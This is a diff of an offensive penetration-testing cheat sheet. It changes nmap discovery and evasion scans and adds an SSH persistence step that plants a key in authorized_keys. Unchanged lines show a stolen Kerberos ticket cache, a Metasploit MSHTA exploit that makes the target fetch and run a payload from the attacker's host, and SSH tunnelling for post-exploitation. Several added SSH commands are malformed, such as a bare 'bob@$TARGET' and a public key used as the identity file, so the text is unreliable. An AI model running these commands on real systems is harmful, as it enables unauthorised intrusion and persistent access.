@@ -5,21 +5,14 @@ export KRB5CCNAME='/home/user/VICTIM@dc01@EXAMPLE.COM.ccache'
 
 # Host Discovery
 ## External
-nmap -Pn "$TARGET" | grep -oP '(?<=report for )\S+' | tee external-ips ; \
-for ip in $(cat external-ips); do nmap=$(nmap -p- --min-rate=3000 --open "$ip" | grep -E '/|PORT|report for' | sed '1d'); \
-echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); \
-echo "sudo nmap -sV -Pn $ip -r -g53 -D 1.1.1.1 -p$ports --min-rate=3000 -sC"; echo; done
+nmap -Pn "$TARGET" -p- --min-rate 3000 --mtu 24
 
 ## Internal
-nmap -Pn "$TARGET" | grep -oP '(?<=report for )\S+' | tee internal-ips ; \
-for ip in $(cat internal-ips); do nmap=$(nmap -p- --min-rate=3000 --open "$ip" | grep -E '/|PORT|report for' | sed '1d'); \
-echo "$nmap"; ports=$(echo "$nmap" | sed -n 's|/.*||p' | paste -sd ','); \
-echo "sudo nmap -sV -Pn $ip -r -g53 -D 1.1.1.1 -p$ports --min-rate=3000 -sC"; echo; done
+nmap -Pn "$TARGET" -p- --min-rate 3000 --mtu 24
 
 # Service Enumeration
 ## Nmap All Scripts
-sudo nmap -sV -Pn "$TARGET" -r -g53 -D 1.1.1.1 -p- --min-rate=3000 -sC
-
+nmap -Pn -sSV "$TARGET" -p22,80,445 --min-rate=3000 --mtu 24 -sC
 
 ## LDAP
 ldap=$(nmap --script "ldap* and not brute" -p 389 "$TARGET"); echo "$ldap"
@@ -136,6 +129,13 @@ export TERM=xterm-256color;
 stty rows <num> columns <num>
 reset
 
+## SSH
+ssh-keygen -f sshkey -N ''; cat sshkey.pub
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
+ssh-add -D
+bob@$TARGET -i sshkey.pub
+bob@$TARGET
+
 ## Windows MSHTA - Metasploit
 msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
 mshta.exe http://$MYIP:8080/nZzLAD.hta
@@ -156,7 +156,7 @@ sessions -i 1
 # Post Exploitation 
 
 ## Linux
-ssh bobby@$TARGET -i id_rsa -L 33060:localhost:33060
+ssh bob@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
 netstat -tuln
 ls -la /opt
 sudo -l
